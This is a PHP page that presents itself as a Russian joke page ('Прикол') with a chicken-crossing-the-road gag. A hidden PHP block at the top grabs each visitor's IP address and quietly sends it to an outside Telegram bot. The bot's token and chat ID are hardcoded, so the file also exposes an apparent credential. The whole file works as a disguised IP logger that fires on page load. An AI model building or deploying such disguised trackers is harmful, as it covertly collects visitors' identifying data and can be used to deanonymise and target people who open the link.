<?php

# Enable Error Reporting and Display:
error_reporting(~0);
ini_set('display_errors', 1);

$ip = $_SERVER['REMOTE_ADDR'];

$token ='7183933629:AAG_nnRTSrYcPmEGtrEbkU48IMcP7LxRRXo';

$chat_id = '1119829680';

$msg = 'IP:'.$ip;

file_get_contents('https://api.telegram.org/bot7183933629:AAG_nnRTSrYcPmEGtrEbkU48IMcP7LxRRXo/sendMessage?chat_id='.$chat_id.'&text='.$msg);

?>


<!DOCTYPE html>
<html>
<head>
	<title>Прикол</title>
</head>
<body>
<p>Почему курица перешла дорогу? 

Чтобы дойти до другой стороны и сказать: «Почему вы меня спрашиваете?»</p>
</body>
</html>